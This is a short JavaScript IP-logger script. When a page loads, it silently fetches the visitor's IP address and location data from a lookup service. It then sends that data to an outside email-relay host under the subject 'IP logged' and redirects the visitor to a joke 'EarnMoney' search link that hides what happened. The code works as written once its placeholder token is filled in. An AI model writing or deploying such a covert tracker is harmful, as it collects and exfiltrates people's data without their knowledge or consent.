var data = {
  access_token: '<your_postmail_token_here>',
};

jQuery.getCORS = function (source, func) {
  var xmlHttpRequestObject;
  if (window.XMLHttpRequest) {
    xmlHttpRequestObject = new XMLHttpRequest();
    if (xmlHttpRequestObject != null) {
      var sUrl = source;
      xmlHttpRequestObject.open('GET', sUrl, true);
      xmlHttpRequestObject.onreadystatechange = function () {
        func(xmlHttpRequestObject.responseText);
      };
      xmlHttpRequestObject.send();
    } else {
      func('Error creating XmlHttpRequest object. Client is not CORS enabled');
    }
  }
};

$(document).ready(function () {
  $.getCORS('https://ipapi.co/json/', function (ip) {
    data['subject'] = 'IP logged';
    data['text'] = ip;

    $.post('https://postmail.invotes.com/send', data, function () {
      //success
      window.location = 'https://letmegooglethat.com/?q=EarnMoney';
    }).fail(function () {
      //error
      window.location = 'https://letmegooglethat.com/?q=EarnMoney';
    });
  });
});
